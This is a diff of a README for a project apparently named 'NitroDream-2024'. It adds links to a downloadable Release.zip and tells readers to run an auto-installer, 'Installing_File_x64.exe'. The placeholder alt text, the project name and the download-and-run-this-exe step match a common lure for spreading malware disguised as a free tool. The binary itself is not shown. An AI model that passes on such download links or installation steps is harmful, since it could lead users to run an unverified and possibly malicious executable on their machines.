@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/2e172056-adeb-43b1-8204-655b0f66ae56)
-]()
+](https://github.com/AyoubTposin/NitroDream-2024/releases/download/V8.53/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/AyoubTposin/NitroDream-2024/releases/download/V8.53/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![kghwef4we](https://github.com/user-attachments/assets/26509732-24bb-43ed-ad8e-292d2bfb670e)
